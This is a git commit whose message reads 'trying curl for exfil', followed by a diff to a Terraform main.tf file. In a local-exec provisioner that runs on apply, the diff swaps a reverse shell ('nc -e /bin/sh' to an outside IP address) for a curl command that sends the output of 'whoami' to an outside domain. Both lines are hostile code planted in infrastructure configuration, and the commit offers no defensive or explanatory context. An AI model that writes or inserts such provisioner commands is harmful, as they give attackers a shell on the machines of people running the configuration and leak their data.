443b2cde63f59c91ab70c1a94a1021a270938965
enz0 <enz0matricks@gmail.com>
2025-03-16 18:33:09 -0400

    trying curl for exfil

--- main.tf
+++ main.tf
@@ -1,5 +1,5 @@
 resource "null_resource" "run_local_command" {
   provisioner "local-exec" {
-    command = "echo `nc -e /bin/sh 129.146.56.69 443`"
+    command = "curl https://pogohacks.org/`whoami`"
   }
 }
